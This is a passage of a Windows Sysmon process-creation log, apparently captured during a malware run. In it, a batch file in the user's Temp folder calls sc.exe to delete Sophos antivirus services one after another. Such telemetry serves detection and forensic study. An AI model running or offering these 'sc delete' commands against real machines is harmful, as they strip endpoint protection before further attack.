                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B40B-000000004A00}; ProcessId=6420; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"SAVService\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B50B-000000004A00}; ProcessId=6972; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"SAVAdminService\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B60B-000000004A00}; ProcessId=1320; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos AutoUpdate Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B70B-000000004A00}; ProcessId=6568; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos Clean Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3369-642A-B80B-000000004A00}; ProcessId=6368; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos Device Control Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487273; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3369-642A-B90B-000000004A00}; ProcessId=6944; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos Endpoint Defense Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487273; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3369-642A-BA0B-000000004A00}; ProcessId=5500; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos File Scanner Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487273; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3369-642A-BB0B-000000004A00}; ProcessId=6936; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos Health Service\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487273; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3369-642A-BC0B-000000004A00}; ProcessId=6952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"Sophos MCS Agent\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487273; RuleName=-}"
                                                                                             },
